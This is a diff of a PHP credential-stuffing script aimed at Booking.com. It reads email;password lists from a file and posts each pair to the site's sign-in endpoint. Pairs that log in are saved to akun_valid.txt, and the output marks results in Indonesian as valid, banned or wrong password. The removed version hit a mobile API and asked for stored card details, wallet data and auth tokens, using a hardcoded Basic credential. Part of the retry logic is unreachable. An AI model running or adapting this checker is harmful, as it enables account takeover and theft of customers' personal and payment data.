@@ -53,39 +53,35 @@ class curl {
 
 class bookingcom extends curl{
 
-    function uuid(){
-        $data = random_bytes(16);
-        $data[6] = chr(ord($data[6]) & 0x0f | 0x40); 
-        $data[8] = chr(ord($data[8]) & 0x3f | 0x80); 
-        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
+    function random($length)
+    {
+        $data = 'qwertyuioplkjhgfdsazxcvbnm0123456789';
+        $string = '';
+        for($i = 0; $i < $length; $i++) {
+            $pos = rand(0, strlen($data)-1);
+            $string .= $data{$pos};
+        }
+        return $string;
     }
 
-    function check($email, $password, $device_id, $header) { 
+    function check($email, $password, $client_id) { 
 
         $method   = 'POST';
-        $header[] = 'Content-Type: application/x-gzip; contains="application/json"; charset=utf-8';
 
-        $endpoint = 'https://secure-iphone-xml.booking.com/json/mobile.login?&user_os=9&user_version=22.9-android&device_id='.$device_id.'&network_type=wifi&languagecode=en-us&display=normal_xxhdpi&affiliate_id=337862 ';
+        $header[] = 'Content-Type: application/json';
+        $header[] = 'X-Requested-With: XMLHttpRequest';
+
+        $endpoint = 'https://account.booking.com/account/sign-in/password';
         
         $param = '{
-            "email": "'.$email.'",
+            "login_name": "'.$email.'",
             "password": "'.$password.'",
-            "dwim": 1,
-            "include_newsletter_subscription_data": "1",
-            "include_rewards_wallet_info": "1",
-            "include_google_state": "1",
-            "include_cc_details": "1",
-            "include_business_cc_info": "1",
-            "include_all_ccs": "1",
-            "include_business_data": "1",
-            "include_assistant_language_code": "1",
-            "detailed_genius_status": "1",
-            "include_bad_booker_info": "1",
-            "include_bbtool_info": "1",
-            "cc_detail_level": "1",
-            "include_email_data": "1",
-            "preferred_travel_purpose": "1",
-            "include_identity_users": "1"
+            "client_id": "'.$client_id.'",
+            "state": "",
+            "scope": "",
+            "code_challenge": "",
+            "code_challenge_method": "",
+            "op_token": "EgVvYXV0aCKNBQoUdk8xS2Jsazd4WDl0VW4yY3BaTFMSCWF1dGhvcml6ZRo1aHR0cHM6Ly9zZWN1cmUuYm9va2luZy5jb20vbG9naW4uaHRtbD9vcD1vYXV0aF9yZXR1cm4qrARVcDREUFZVbGQ4MUFaZU1mb2NFdFBSelhYQzBkRG9mNVl5dmJWaG5lS0tadGhuYUhBRFNKT0U2MGtaRHRKcy1XRzVXSHFTaXR4QmZ1VVBYMy02X3lJNC1kTEoyV0hIWXNmcDZrLWFiMlNKRGltUE1DaTE2S0NrZjNQM3R6Q1lvejJBN0dGQTRva0pHM2NLeElDLVlUT21NQk1aSzUtVEpGWElUVDQwclZlOERZRWpxNGxXaUFVUXVlUlJaOUo2SmhCdDhGbWdETW9BaTAtU1JIdWdiVWg3NTlrSWhrcDVsc2tXSXBseXJDZ3dIaFhoLXB4WGVrZlFMWFNBSXd2Tllkd291VDhDQmlHTVA2MHBhV3lmdWlTZnhVWUlkV2lobkd2QlkwWTN2RWNraWRkci1JM2RHZDVrRC1sVHNQOU9kLUExX2ZjaEkwcFZSUkZjdUo0TnJTallJUVZkd2Q0eXJ4MjZXb3VOM1g1UE9MdjhEQ2lZRFJidW14alg2dFZfR0JnRl9XSHM3bGNjUVdWNFNrby1yR3Nzb19UYmlVNXRud1JuTUFNTm56LUUzaF91TmN0b3RYMm96b09RSEdnZFo2OVFMOEFZY25qS2t0anRjVklFRlBfNGgzY1ZqeHhUWnR6Ry1TZG5odk9RbU0yN21mR0ZLcjR4OUNFam55bnJqa3hZM20wd2pHdFg3TjV5aGQ4VkIxbDFLbktaTFVsSUtSM2dtcGVETm9JWG43QgRjb2RlKg4IjsgSOgBCAFiJzuz3BQ"
         }';
         
         retry:
@@ -93,7 +89,7 @@ class bookingcom extends curl{
 
         $json = json_decode($check);
  
-        if(isset($json->auth_token)) { 
+        if($json->next_step == 'redirect') { 
 
             $file = dirname(__FILE__)."/akun_valid.txt";
             if(file_exists($file)) {
@@ -101,23 +97,20 @@ class bookingcom extends curl{
             }
 
             $fh = fopen($file, "a");
-            fwrite($fh, $email.";".$password.";token_".$json->auth_token.";device_id_".$device_id);
+            fwrite($fh, $email.";".$password);
             fclose($fh);
 
-            if($json->profile->email_data[0]->email_verified == 0) { 
-                return "Sukses Login ".$email.". Email Verified: FALSE\n";
-            } else {
-                return "Sukses Login ".$email.". Email Verified: TRUE\n";
-            }
+            return $email.". AMAN BRO\n";
             
+        } elseif ($json->next_step == '/account-disabled') {
+            return $email." BANNED\n"; 
+        } elseif ($json->errors[0] == 1203) {
+            return $email." SALAH PASSWORD\n"; 
         } else {
-            if($json->code == "1008") {
-                echo "[!] Error [".$json->code."] ".$json->message."\n";
-                sleep(2);
-                goto retry;
-            }
-            return "".$email." Error [".$json->code."] ".$json->message."\n"; 
-        }         
+            return "[!] UNKNOWN ERROR\n"; 
+            sleep(2);
+            goto retry;
+        }       
     }
 }
 
@@ -136,11 +129,6 @@ echo "\nPut your account in akun.txt (format: email;password)\n";
 
 $bocom = new bookingcom();
 
-$header[] = 'X-LIBRARY: okhttp+network-api';
-$header[] = 'Authorization: Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN';
-$header[] = 'X-Booking-API-Version: 1';
-$header[] = 'Host: secure-iphone-xml.booking.com';
-
 echo "Enter...";
 trim(fgets(STDIN));
 
@@ -152,12 +140,17 @@ if(file_exists($file)) {
     $no=1;
     foreach ($list as $value) {
 
+        if(!is_numeric(strpos($value, ';'))) {
+            echo "(!) Format harus email;password\n\n";
+            die();
+        }
+
         $account = explode(";", $value);
         $email     = $account[0];
         $password  = $account[1];
-        $device_id = $bocom->uuid();
+        $client_id = $bocom->random(16);
         
-        $check = $bocom->check($email, $password, $device_id, $header);
+        $check = $bocom->check($email, $password, $client_id);
 
         echo "[".$no++."] ".$check;
     }
